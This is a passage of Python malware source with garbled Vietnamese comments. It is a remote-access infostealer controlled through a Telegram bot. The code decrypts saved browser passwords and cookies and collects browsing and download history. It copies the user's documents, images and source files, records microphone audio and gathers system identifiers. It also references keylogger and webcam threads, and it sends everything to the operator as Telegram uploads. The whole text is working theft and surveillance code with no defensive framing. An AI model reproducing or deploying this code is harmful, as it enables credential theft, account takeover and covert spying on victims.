        # Thu th·∫≠p d·ªØ li·ªáu t·ª´ m·ªói tr√¨nh duy·ªát
        for browser_info in browsers:
            browser_path, has_profiles = browser_info
            
            try:
                # L·∫•y master key
                master_key = get_master_key(browser_path)
                if not master_key:
                    continue
                
                # X√°c ƒë·ªãnh c√°c profiles c·∫ßn qu√©t
                profiles = get_browser_profiles(browser_path, has_profiles)
                
                # X·ª≠ l√Ω t·ª´ng profile
                for profile in profiles:
                    profile_path = get_profile_path(browser_path, profile, has_profiles)
                    
                    # Thu th·∫≠p m·∫≠t kh·∫©u
                    collect_passwords(profile_path, master_key, data, has_profiles)
                    
                    # Thu th·∫≠p cookie
                    collect_cookies(profile_path, master_key, data, has_profiles)
                    
                    # Thu th·∫≠p l·ªãch s·ª≠
                    collect_history(profile_path, data)
                    
                    # Thu th·∫≠p l∆∞·ª£t t·∫£i xu·ªëng
                    collect_downloads(profile_path, data)
                    
            except Exception as e:
                print(f"L·ªói khi x·ª≠ l√Ω tr√¨nh duy·ªát {browser_path}: {e}")
        
        # L∆∞u k·∫øt qu·∫£ v√†o c√°c file
        save_results(data, temp_dir)
        
        # T·∫°o file t·ªïng h·ª£p
        create_summary(data, temp_dir)
        
        # N√©n file
        zip_path = os.path.join(TEMP_DIR, PC_NAME)
        shutil.make_archive(zip_path, 'zip', temp_dir)
        
        # G·ª≠i file
        await send_result_file(context, update.effective_chat.id, zip_path, data)
        
        # D·ªçn d·∫πp
        cleanup_temp_files(temp_dir, zip_path)
            
    except Exception as e:
        await update.message.reply_text(f"‚ùå L·ªói: {str(e)}")

def detect_browsers():
    """Ph√°t hi·ªán c√°c tr√¨nh duy·ªát ƒë√£ c√†i ƒë·∫∑t"""
    browsers = []
    for root in [LOCAL_APPDATA, os.getenv('APPDATA')]:
        for directory in os.listdir(root):
            try:
                for _root, _, _ in os.walk(os.path.join(root, directory)):
                    if "Local State" in os.listdir(_root):
                        if "Default" in os.listdir(_root):
                            browsers.append([_root, True])  # C√≥ profile
                        elif "Login Data" in os.listdir(_root):
                            browsers.append([_root, False])  # Kh√¥ng c√≥ profile
            except Exception:
                pass
    return browsers

def get_browser_profiles(browser_path, has_profiles):
    """L·∫•y danh s√°ch profiles c·ªßa tr√¨nh duy·ªát"""
    profiles = ["Default"]
    if has_profiles:
        for directory in os.listdir(browser_path):
            if directory.startswith("Profile "):
                profiles.append(directory)
    return profiles

def get_profile_path(browser_path, profile, has_profiles):
    """L·∫•y ƒë∆∞·ªùng d·∫´n ƒë·∫øn profile"""
    return browser_path if not has_profiles else os.path.join(browser_path, profile)

def collect_passwords(profile_path, master_key, data, has_profiles):
    """Thu th·∫≠p m·∫≠t kh·∫©u t·ª´ profile"""
    try:
        login_db = os.path.join(profile_path, "Login Data")
        
        if not has_profiles:
            login_db = os.path.join(profile_path, "Login Data")
        
        if os.path.exists(login_db):
            temp_file = create_temp_db_copy(login_db, os.path.dirname(login_db))
            
            conn = sql_connect(temp_file)
            cursor = conn.cursor()
            cursor.execute("SELECT action_url, username_value, password_value FROM logins")
            
            for row in cursor.fetchall():
                if row[0]:
                    # Ki·ªÉm tra domain c√≥ trong danh s√°ch t·ª´ kh√≥a
                    for keyword in k3YW0rd:
                        domain = keyword
                        if "[" in keyword:
                            domain = keyword.split('[')[1].split(']')[0]
                        
                        if domain in row[0]:
                            if keyword not in data['passwords']['domains']:
                                data['passwords']['domains'].append(keyword)
                            
                            # Th√™m v√†o danh s√°ch m·∫≠t kh·∫©u
                            password = decrypt_browser_value(row[2], master_key)
                            data['passwords']['items'].append(f"URL: {row[0]} | Username: {row[1]} | Password: {password}")
                            data['passwords']['count'] += 1
                            break
            
            cursor.close()
            conn.close()
            os.remove(temp_file)
    except Exception as e:
        print(f"L·ªói khi thu th·∫≠p m·∫≠t kh·∫©u: {e}")

def collect_cookies(profile_path, master_key, data, has_profiles):
    """Thu th·∫≠p cookies t·ª´ profile"""
    try:
        # X√°c ƒë·ªãnh ƒë∆∞·ªùng d·∫´n ƒë·∫øn file cookies
        cookie_path = None
        try:
            if has_profiles:
                if "Network" in os.listdir(profile_path):
                    cookie_path = os.path.join(profile_path, "Network", "Cookies")
                else:
                    cookie_path = os.path.join(profile_path, "Cookies")
            else:
                if "Network" in os.listdir(profile_path):
                    cookie_path = os.path.join(profile_path, "Network", "Cookies")
                else:
                    cookie_path = os.path.join(profile_path, "Cookies")
        except PermissionError:
            print(f"L·ªói: Kh√¥ng c√≥ quy·ªÅn truy c·∫≠p th∆∞ m·ª•c {profile_path}")
            print("Vui l√≤ng ch·∫°y v·ªõi quy·ªÅn administrator")
            return
            
        if not cookie_path or not os.path.exists(cookie_path):
            print(f"File cookie kh√¥ng t·ªìn t·∫°i t·∫°i {cookie_path}")
            return
            
        # T·∫°o b·∫£n sao t·∫°m th·ªùi trong TEMP_DIR
        try:
            temp_file = create_temp_db_copy(cookie_path, TEMP_DIR)
            if not temp_file:
                print(f"Kh√¥ng th·ªÉ t·∫°o b·∫£n sao t·∫°m th·ªùi c·ªßa file cookie")
                return
                
            try:
                conn = sql_connect(temp_file)
                cursor = conn.cursor()
                cursor.execute("SELECT host_key, name, encrypted_value FROM cookies")
                
                for row in cursor.fetchall():
                    if row[2]:  # Ch·ªâ x·ª≠ l√Ω n·∫øu c√≥ encrypted_value
                        try:
                            cookie_val = decrypt_browser_value(row[2], master_key)
                            if cookie_val:
                                data['cookies']['items'].append(f"Host: {row[0]} | Name: {row[1]} | Value: {cookie_val}")
                                data['cookies']['count'] += 1
                        except Exception as e:
                            print(f"L·ªói khi gi·∫£i m√£ cookie: {str(e)}")
                            continue
                            
                cursor.close()
                conn.close()
                
            except Exception as e:
                print(f"L·ªói khi truy v·∫•n database cookie: {str(e)}")
                
            finally:
                try:
                    os.remove(temp_file)
                except:
                    pass
                    
        except PermissionError:
            print(f"L·ªói: Kh√¥ng c√≥ quy·ªÅn truy c·∫≠p file {cookie_path}")
            print("Vui l√≤ng ch·∫°y v·ªõi quy·ªÅn administrator")
            
    except Exception as e:
        print(f"L·ªói kh√¥ng x√°c ƒë·ªãnh khi thu th·∫≠p cookies: {str(e)}")

def collect_history(profile_path, data):
    """Thu th·∫≠p l·ªãch s·ª≠ duy·ªát web t·ª´ profile"""
    try:
        history_path = os.path.join(profile_path, "History")
        
        if os.path.exists(history_path):
            temp_file = create_temp_db_copy(history_path, os.path.dirname(history_path))
            
            conn = sql_connect(temp_file)
            cursor = conn.cursor()
            cursor.execute("SELECT url, title, last_visit_time FROM urls")
            
            for row in cursor.fetchall():
                data['history']['items'].append(f"URL: {row[0]} | Title: {row[1]} | Last Visit: {row[2]}")
                data['history']['count'] += 1
            
            cursor.close()
            conn.close()
            os.remove(temp_file)
    except Exception as e:
        print(f"L·ªói khi thu th·∫≠p l·ªãch s·ª≠: {e}")

def collect_downloads(profile_path, data):
    """Thu th·∫≠p l·ªãch s·ª≠ t·∫£i xu·ªëng t·ª´ profile"""
    try:
        history_path = os.path.join(profile_path, "History")
        
        if os.path.exists(history_path):
            temp_file = create_temp_db_copy(history_path, os.path.dirname(history_path))
            
            conn = sql_connect(temp_file)
            cursor = conn.cursor()
            cursor.execute("SELECT tab_url, target_path FROM downloads")
            
            for row in cursor.fetchall():
                data['downloads']['items'].append(f"URL: {row[0]} | ƒê∆∞·ªùng d·∫´n: {row[1]}")
                data['downloads']['count'] += 1
            
            cursor.close()
            conn.close()
            os.remove(temp_file)
    except Exception as e:
        print(f"L·ªói khi thu th·∫≠p l·ªãch s·ª≠ t·∫£i xu·ªëng: {e}")

def save_results(data, temp_dir):
    """L∆∞u k·∫øt qu·∫£ v√†o c√°c file"""
    # L∆∞u m·∫≠t kh·∫©u
    with open(os.path.join(temp_dir, "passwords.txt"), "w", encoding="utf-8") as f:
        f.write(f"T·ªïng s·ªë m·∫≠t kh·∫©u: {data['passwords']['count']}\n")
        f.write(f"C√°c trang web: {', '.join(data['passwords']['domains'])}\n\n")
        f.write("Chi ti·∫øt m·∫≠t kh·∫©u:\n")
        for item in data['passwords']['items']:
            f.write(f"{item}\n")
    
    # L∆∞u cookies
    with open(os.path.join(temp_dir, "cookies.txt"), "w", encoding="utf-8") as f:
        f.write(f"T·ªïng s·ªë cookie: {data['cookies']['count']}\n\n")
        f.write("Chi ti·∫øt cookie:\n")
        for item in data['cookies']['items']:
            f.write(f"{item}\n")
    
    # L∆∞u l·ªãch s·ª≠
    with open(os.path.join(temp_dir, "history.txt"), "w", encoding="utf-8") as f:
        f.write(f"T·ªïng s·ªë m·ª•c l·ªãch s·ª≠: {data['history']['count']}\n\n")
        f.write("Chi ti·∫øt l·ªãch s·ª≠:\n")
        for item in data['history']['items']:
            f.write(f"{item}\n")
    
    # L∆∞u l·ªãch s·ª≠ t·∫£i xu·ªëng
    with open(os.path.join(temp_dir, "downloads.txt"), "w", encoding="utf-8") as f:
        f.write(f"T·ªïng s·ªë l∆∞·ª£t t·∫£i xu·ªëng: {data['downloads']['count']}\n\n")
        f.write("Chi ti·∫øt t·∫£i xu·ªëng:\n")
        for item in data['downloads']['items']:
            f.write(f"{item}\n")

def create_summary(data, temp_dir):
    """T·∫°o file t·ªïng h·ª£p"""
    with open(os.path.join(temp_dir, "summary.txt"), "w", encoding="utf-8") as f:
        f.write(f"===== TH√îNG TIN THU TH·∫¨P ƒê∆Ø·ª¢C =====\n\n")
        f.write(f"T·ªïng s·ªë m·∫≠t kh·∫©u: {data['passwords']['count']}\n")
        f.write(f"T·ªïng s·ªë cookie: {data['cookies']['count']}\n")
        f.write(f"T·ªïng s·ªë m·ª•c l·ªãch s·ª≠: {data['history']['count']}\n")
        f.write(f"T·ªïng s·ªë l∆∞·ª£t t·∫£i xu·ªëng: {data['downloads']['count']}\n\n")
        f.write(f"C√°c trang web t√¨m th·∫•y: {', '.join(data['passwords']['domains'])}\n")

async def send_result_file(context, chat_id, zip_path, data):
    """G·ª≠i file k·∫øt qu·∫£ v·ªÅ Telegram"""
    with open(zip_path + ".zip", 'rb') as doc:
        await context.bot.send_document(
            chat_id=chat_id,
            document=doc,
            caption=f"üì¶ ƒê√£ thu th·∫≠p ƒë∆∞·ª£c:\n"
                    f"- {data['passwords']['count']} m·∫≠t kh·∫©u\n"
                    f"- {data['cookies']['count']} cookie\n"
                    f"- {data['history']['count']} m·ª•c l·ªãch s·ª≠\n"
                    f"- {data['downloads']['count']} l∆∞·ª£t t·∫£i xu·ªëng"
        )

def cleanup_temp_files(temp_dir, zip_path):
    """D·ªçn d·∫πp c√°c file t·∫°m th·ªùi"""
    try:
        shutil.rmtree(temp_dir)
        os.remove(zip_path + ".zip")
    except Exception as e:
        print(f"L·ªói khi d·ªçn d·∫πp file t·∫°m: {e}")

@require_auth
async def steal_files(update: Update, context: ContextTypes.DEFAULT_TYPE):
    """Command ƒë·ªÉ thu th·∫≠p file theo ƒë·ªãnh d·∫°ng"""
    extensions = [
        # H√¨nh ·∫£nh
        '.png', '.jpg', '.jpeg', '.gif', '.bmp',
        # Video
        '.mp4', '.avi', '.mkv', '.flv', '.mov',
        # Audio
        '.mp3', '.wav', '.flac', '.ogg',
        # T√†i li·ªáu vƒÉn ph√≤ng
        '.pdf', '.doc', '.docx', '.xls', '.xlsx', '.ppt', '.pptx',
        # VƒÉn b·∫£n
        '.txt', '.rtf', '.csv',
        # T·ªáp n√©n
        '.zip', '.rar', '.7z',
        # M√£ ngu·ªìn
        '.py', '.java', '.cpp', '.c', '.cs', '.js', '.php', '.html', '.css'
    ]
    
    try:
        # T·∫°o th∆∞ m·ª•c t·∫°m th·ªùi
        temp_dir = os.path.join(TEMP_DIR, "stolen_files")
        if not os.path.exists(temp_dir):
            os.makedirs(temp_dir)
            
        status_message = await update.message.reply_text("üîç ƒêang t√¨m ki·∫øm c√°c file...")
        total_files = 0
        copied_files = 0
        skipped_files = 0
        
        # Thu th·∫≠p file t·ª´ c√°c th∆∞ m·ª•c quan tr·ªçng v·ªõi gi·ªõi h·∫°n k√≠ch th∆∞·ªõc
        max_file_size = 10 * 1024 * 1024  # 10MB
        important_dirs = ['Desktop', 'Documents', 'Downloads', 'Pictures']
        
        for dir_name in important_dirs:
            dir_path = os.path.join(os.path.expanduser("~"), dir_name)
            if os.path.exists(dir_path):
                try:
                    # C·∫≠p nh·∫≠t tr·∫°ng th√°i
                    await status_message.edit_text(
                        f"üîç ƒêang qu√©t th∆∞ m·ª•c {dir_name}...\n"
                        f"ƒê√£ t√¨m th·∫•y: {total_files} file\n"
                        f"ƒê√£ sao ch√©p: {copied_files} file\n"
                        f"ƒê√£ b·ªè qua: {skipped_files} file"
                    )
                    
                    # S·ª≠ d·ª•ng os.walk v·ªõi topdown=True ƒë·ªÉ c√≥ th·ªÉ b·ªè qua th∆∞ m·ª•c
                    for root, dirs, files in os.walk(dir_path, topdown=True):
                        # B·ªè qua c√°c th∆∞ m·ª•c h·ªá th·ªëng v√† ·∫©n
                        dirs[:] = [d for d in dirs if not d.startswith('.')]
                        
                        for file in files:
                            if any(file.lower().endswith(ext) for ext in extensions):
                                total_files += 1
                                try:
                                    src_path = os.path.join(root, file)
                                    # Ki·ªÉm tra k√≠ch th∆∞·ªõc file
                                    if os.path.getsize(src_path) <= max_file_size:
                                        dst_path = os.path.join(temp_dir, file)
                                        shutil.copy2(src_path, dst_path)
                                        copied_files += 1
                                    else:
                                        skipped_files += 1
                                except:
                                    skipped_files += 1
                                    continue
                                
                                # C·∫≠p nh·∫≠t tr·∫°ng th√°i sau m·ªói 10 file
                                if total_files % 10 == 0:
                                    try:
                                        await status_message.edit_text(
                                            f"üîç ƒêang qu√©t th∆∞ m·ª•c {dir_name}...\n"
                                            f"ƒê√£ t√¨m th·∫•y: {total_files} file\n"
                                            f"ƒê√£ sao ch√©p: {copied_files} file\n"
                                            f"ƒê√£ b·ªè qua: {skipped_files} file"
                                        )
                                    except:
                                        pass
                except Exception as e:
                    print(f"L·ªói khi qu√©t th∆∞ m·ª•c {dir_name}: {e}")
                    continue
        
        if copied_files == 0:
            await status_message.edit_text("‚ùå Kh√¥ng t√¨m th·∫•y file n√†o ph√π h·ª£p!")
            shutil.rmtree(temp_dir)
            return
            
        await status_message.edit_text(
            f"üì¶ ƒêang n√©n {copied_files} file...\n"
            f"Vui l√≤ng ƒë·ª£i trong gi√¢y l√°t."
        )
        
        # N√©n file v·ªõi gi·ªõi h·∫°n k√≠ch th∆∞·ªõc chunk
        zip_path = os.path.join(TEMP_DIR, "stolen_files.zip")
        chunk_size = 64 * 1024  # 64KB chunks
        
        with zipfile.ZipFile(zip_path, 'w', zipfile.ZIP_DEFLATED) as zipf:
            for root, _, files in os.walk(temp_dir):
                for file in files:
                    file_path = os.path.join(root, file)
                    arcname = os.path.relpath(file_path, temp_dir)
                    zipf.write(file_path, arcname)
        
        # G·ª≠i file v·ªõi timeout cao h∆°n
        with open(zip_path, 'rb') as doc:
            await context.bot.send_document(
                chat_id=update.effective_chat.id,
                document=doc,
                caption=f"üì¶ ƒê√£ thu th·∫≠p ƒë∆∞·ª£c {copied_files} file\n"
                        f"(ƒê√£ b·ªè qua {skipped_files} file qu√° l·ªõn)",
                read_timeout=300,
                write_timeout=300,
                connect_timeout=300,
                pool_timeout=300
            )
            
        # D·ªçn d·∫πp
        try:
            shutil.rmtree(temp_dir)
            os.remove(zip_path)
        except:
            pass
            
        await status_message.edit_text("‚úÖ ƒê√£ ho√†n th√†nh thu th·∫≠p file!")
        
    except Exception as e:
        await update.message.reply_text(f"‚ùå L·ªói: {str(e)}")
        # D·ªçn d·∫πp trong tr∆∞·ªùng h·ª£p l·ªói
        try:
            if os.path.exists(temp_dir):
                shutil.rmtree(temp_dir)
            if os.path.exists(zip_path):
                os.remove(zip_path)
        except:
            pass

@require_auth
async def system_info(update: Update, context: ContextTypes.DEFAULT_TYPE):
    """Command ƒë·ªÉ l·∫•y th√¥ng tin h·ªá th·ªëng"""
    try:
        import socket
        
        # L·∫•y hostname v√† IP
        hostname = socket.gethostname()  # T√™n m√°y t√≠nh trong m·∫°ng
        local_ip = socket.gethostbyname(hostname)  # IP c·ªßa m√°y t√≠nh
        
        # Thu th·∫≠p th√¥ng tin v·ªõi gi·∫£i th√≠ch ti·∫øng Vi·ªát
        info = {
            "PC Name": PC_NAME,          # T√™n m√°y t√≠nh trong Windows
            "Username": getpass.getuser(),       # T√™n ng∆∞·ªùi d√πng ƒëang ƒëƒÉng nh·∫≠p
            "Hostname": hostname,                # T√™n ƒë·ªãnh danh m√°y t√≠nh trong m·∫°ng
            "OS": platform.system() + " " + platform.release(),  # H·ªá ƒëi·ªÅu h√†nh
            "MAC Address": ':'.join(['{:02x}'.format((uuid.getnode() >> elements) & 0xff) 
                          for elements in range(0,8*6,8)][::-1]),  # ƒê·ªãa ch·ªâ MAC
            "Local IP": local_ip,               # ƒê·ªãa ch·ªâ IP trong m·∫°ng n·ªôi b·ªô
        }
        
        # T·∫°o message
        message = "*üíª Th√¥ng tin h·ªá th·ªëng*\n\n"
        for key, value in info.items():
            message += f"*{key}:* `{value}`\n"
            
        await update.message.reply_text(
            message,
            parse_mode='Markdown'
        )
        
    except Exception as e:
        await update.message.reply_text(f"‚ùå L·ªói: {str(e)}")

# Th√™m bi·∫øn ƒë·ªÉ ki·ªÉm so√°t ghi √¢m
is_recording_audio = False
audio_task = None

# Th√™m h√†m ƒëi·ªÅu khi·ªÉn ghi √¢m
@require_auth
async def record_control(update: Update, context: ContextTypes.DEFAULT_TYPE):
    keyboard = [
        [
            InlineKeyboardButton("üéôÔ∏è B·∫Øt ƒë·∫ßu ghi", callback_data="start_recording_audio"),
            InlineKeyboardButton("‚èπÔ∏è D·ª´ng ghi", callback_data="stop_recording_audio")
        ]
    ]
    reply_markup = InlineKeyboardMarkup(keyboard)
    await update.message.reply_text(
        "üéôÔ∏è ƒêi·ªÅu khi·ªÉn ghi √¢m:\n"
        "‚Ä¢ B·∫Øt ƒë·∫ßu ghi: Ghi √¢m trong 30 gi√¢y\n"
        "‚Ä¢ D·ª´ng ghi: D·ª´ng ghi √¢m ngay l·∫≠p t·ª©c",
        reply_markup=reply_markup
    )

# Th√™m h√†m x·ª≠ l√Ω c√°c n√∫t ƒëi·ªÅu khi·ªÉn ghi √¢m
async def handle_audio_recording(update: Update, context: ContextTypes.DEFAULT_TYPE):
    global is_recording_audio, audio_task
    query = update.callback_query
    await query.answer()
    
    try:
        if query.data == "start_recording_audio":
            if is_recording_audio:
                await query.answer("ƒêang ghi √¢m!", show_alert=True)
                return

            # B·∫Øt ƒë·∫ßu ghi √¢m
            async def record_audio():
                global is_recording_audio
                try:
                    # C·∫•u h√¨nh ghi √¢m
                    duration = 30  # Th·ªùi gian ghi √¢m (gi√¢y)
                    fs = 44100    # T·∫ßn s·ªë l·∫•y m·∫´u
                    channels = 2   # S·ªë k√™nh (stereo)
                    
                    # B·∫Øt ƒë·∫ßu ghi
                    is_recording_audio = True
                    await query.edit_message_text("üéôÔ∏è ƒêang ghi √¢m... (30 gi√¢y)")
                    
                    # Ghi √¢m
                    recording = sd.rec(int(duration * fs), samplerate=fs, channels=channels)
                    sd.wait()
                    
                    if not is_recording_audio:  # Ki·ªÉm tra n·∫øu ƒë√£ d·ª´ng gi·ªØa ch·ª´ng
                        return
                        
                    # Chuy·ªÉn recording th√†nh bytes
                    audio_buffer = BytesIO()
                    wavio.write(audio_buffer, recording, fs, sampwidth=3)
                    audio_buffer.seek(0)
                    
                    await context.bot.send_audio(
                        chat_id=query.message.chat_id,
                        audio=audio_buffer,
                        caption="üéµ File ghi √¢m",
                        title=f"audio_{datetime.now().strftime('%Y%m%d_%H%M%S')}.wav"
                    )
                    
                    is_recording_audio = False
                    await query.edit_message_text("‚úÖ ƒê√£ ho√†n th√†nh ghi √¢m!")
                    
                except Exception as e:
                    is_recording_audio = False
                    await context.bot.send_message(
                        chat_id=query.message.chat_id,
                        text=f"‚ùå L·ªói khi ghi √¢m: {str(e)}"
                    )

            audio_task = asyncio.create_task(record_audio())
            await query.answer("ƒêang b·∫Øt ƒë·∫ßu ghi √¢m...", show_alert=True)

        elif query.data == "stop_recording_audio":
            if not is_recording_audio:
                await query.answer("Kh√¥ng c√≥ phi√™n ghi √¢m n√†o ƒëang ch·∫°y!", show_alert=True)
                return
                
            is_recording_audio = False
            if audio_task:
                try:
                    audio_task.cancel()
                except:
                    pass
                audio_task = None
            await query.edit_message_text("‚èπÔ∏è ƒê√£ d·ª´ng ghi √¢m")

    except Exception as e:
        await query.edit_message_text(f"‚ùå L·ªói: {str(e)}")

# Th√™m h√†m x·ª≠ l√Ω tin nh·∫Øn th∆∞·ªùng
async def graceful_shutdown(application):
    """X·ª≠ l√Ω vi·ªác t·∫Øt bot m·ªôt c√°ch an to√†n v√† d·ªçn d·∫πp t√†i nguy√™n"""
    print("üì§ ƒêang t·∫Øt bot an to√†n...")
    
    try:
        # 1. D·ª´ng c√°c t√°c v·ª• ƒëang ch·∫°y
        await stop_running_tasks()
        
        # 2. D·ª´ng c√°c th√†nh ph·∫ßn c·ªßa bot
        await stop_telegram_components(application)
        
        # 3. D·ªçn d·∫πp file t·∫°m v√† file lock
        cleanup_temporary_files()
        
        print("‚úÖ Bot ƒë√£ d·ª´ng th√†nh c√¥ng!")
    except Exception as e:
        print(f"‚ùå L·ªói trong qu√° tr√¨nh t·∫Øt: {e}")

async def stop_running_tasks():
    """D·ª´ng c√°c t√°c v·ª• ƒëang ch·∫°y"""
    global is_streaming, is_recording, is_logging, is_recording_audio
    
    # ƒê·∫∑t c√°c bi·∫øn ki·ªÉm so√°t v·ªÅ False ƒë·ªÉ d·ª´ng c√°c v√≤ng l·∫∑p
    is_streaming = False
    is_recording = False
    is_logging = False
    is_recording_audio = False
    
    # D·ª´ng c√°c task b·∫•t ƒë·ªìng b·ªô
    for task_name, task in [
        ('stream_task', stream_task), 
        ('webcam_task', webcam_task), 
        ('audio_task', audio_task)
    ]:
        if task_name in globals() and task:
            try:
                task.cancel()
                print(f"‚úì ƒê√£ d·ª´ng {task_name}")
            except Exception as e:
                print(f"‚úó L·ªói khi d·ª´ng {task_name}: {e}")
    
    # D·ª´ng keylogger thread
    if 'log_thread' in globals() and log_thread and log_thread.is_alive():
        try:
            # Join v·ªõi timeout ƒë·ªÉ tr√°nh treo ·ª©ng d·ª•ng
            log_thread.join(timeout=1)
            print("‚úì ƒê√£ d·ª´ng keylogger thread")
        except Exception as e:
            print(f"‚úó L·ªói khi d·ª´ng keylogger thread: {e}")
    
    # Cho ph√©p th·ªùi gian ƒë·ªÉ c√°c task d·ª´ng
    await asyncio.sleep(0.5)

async def stop_telegram_components(application):
    """D·ª´ng c√°c th√†nh ph·∫ßn Telegram"""
    # D·ª´ng updater tr∆∞·ªõc n·∫øu ƒëang ch·∫°y
    if hasattr(application, 'updater') and application.updater and application.updater.running:
        try:
            await application.updater.stop()
            print("‚úì ƒê√£ d·ª´ng updater")
        except Exception as e:
            print(f"‚úó L·ªói khi d·ª´ng updater: {e}")
    
    # D·ª´ng application
    if hasattr(application, 'running') and application.running:
        try:
            await application.stop()
            print("‚úì ƒê√£ d·ª´ng application")
        except Exception as e:
            print(f"‚úó L·ªói khi d·ª´ng application: {e}")

def cleanup_temporary_files():
    """D·ªçn d·∫πp c√°c file t·∫°m v√† file lock"""
    # X√≥a c√°c file t·∫°m
    try:
        temp_files = ['temp_video.mp4']
        for file in temp_files:
            if os.path.exists(file):
                os.remove(file)
                print(f"‚úì ƒê√£ x√≥a file t·∫°m {file}")
    except Exception as e:
        print(f"‚úó L·ªói khi x√≥a file t·∫°m: {e}")
    
    # X√≥a file lock
    try:
        lock_file = os.path.join(tempfile.gettempdir(), 'telegram_bot.lock')
        if os.path.exists(lock_file):
            os.remove(lock_file)
            print("‚úì ƒê√£ x√≥a file lock")
    except Exception as e:
        print(f"‚úó L·ªói khi x√≥a file lock: {e}")

def prepare_environment():
    """Chu·∫©n b·ªã m√¥i tr∆∞·ªùng tr∆∞·ªõc khi kh·ªüi ƒë·ªông"""
    # T·∫°o th∆∞ m·ª•c l∆∞u tr·ªØ bot_data n·∫øu ch∆∞a t·ªìn t·∫°i
    bot_data_dir = os.path.dirname(os.path.abspath(__file__))
    os.makedirs(bot_data_dir, exist_ok=True)
    
    # X·ª≠ l√Ω file lock c≈©
    handle_stale_lock_file()

def handle_stale_lock_file():
    """X·ª≠ l√Ω file lock c≈© t·ª´ c√°c phi√™n tr∆∞·ªõc b·ªã crash"""
    lock_file = os.path.join(tempfile.gettempdir(), 'telegram_bot.lock')
    
    if os.path.exists(lock_file):
        try:
            with open(lock_file, 'r') as f:
                content = f.read().strip()
                
            # Ki·ªÉm tra ƒë·ªãnh d·∫°ng c·ªßa file lock
            if ',' in content:
                parts = content.split(',')
                timestamp = parts[1]
                
                # Ki·ªÉm tra xem file lock c√≥ c≈© h∆°n 30 ph√∫t kh√¥ng
                lock_time = datetime.strptime(timestamp, '%Y-%m-%d %H:%M:%S')
                if (datetime.now() - lock_time).total_seconds() > 1800:  # 30 ph√∫t
                    os.remove(lock_file)
                    print("‚úÖ ƒê√£ x√≥a file lock c≈© (>30 ph√∫t)")
        except Exception:
            # N·∫øu c√≥ l·ªói khi ƒë·ªçc ho·∫∑c x·ª≠ l√Ω file, x√≥a n√≥
            os.remove(lock_file)
            print("‚úÖ ƒê√£ x√≥a file lock kh√¥ng h·ª£p l·ªá")

def cleanup_lock_file():
    """D·ªçn d·∫πp file lock khi tho√°t ·ª©ng d·ª•ng"""
    try:
        lock_file = os.path.join(tempfile.gettempdir(), 'telegram_bot.lock')
        if os.path.exists(lock_file):
            os.remove(lock_file)
    except Exception:
        pass

if __name__ == "__main__":
    """ƒêi·ªÉm kh·ªüi ƒë·ªông ch√≠nh c·ªßa ·ª©ng d·ª•ng"""
    try:
        # ƒê·∫∑t bi·∫øn m√¥i tr∆∞·ªùng ƒë·ªÉ t·∫Øt c√°c c·∫£nh b√°o kh√¥ng c·∫ßn thi·∫øt
        os.environ['PYTHONWARNINGS'] = 'ignore:Unverified HTTPS request'
        
        # Chu·∫©n b·ªã th∆∞ m·ª•c v√† m√¥i tr∆∞·ªùng
        prepare_environment()
        
        # Kh·ªüi ƒë·ªông main loop v·ªõi asyncio
        asyncio.run(main())
        
    except KeyboardInterrupt:
        print("\nüëã K·∫øt th√∫c ·ª©ng d·ª•ng theo y√™u c·∫ßu ng∆∞·ªùi d√πng")
    except asyncio.CancelledError:
        print("\nüõë ·ª®ng d·ª•ng ƒë√£ b·ªã h·ªßy b·ªè")
    except SystemExit:
        # ƒê√£ x·ª≠ l√Ω trong main()
        pass
    except Exception as e:
        print(f"\n‚ùå L·ªói nghi√™m tr·ªçng: {e}")
        import traceback
        traceback.print_exc()
    finally:
        # ƒê·∫£m b·∫£o file lock ƒë∆∞·ª£c x√≥a trong m·ªçi tr∆∞·ªùng h·ª£p
        cleanup_lock_file()
        print("üëã ƒê√£ tho√°t ·ª©ng d·ª•ng")
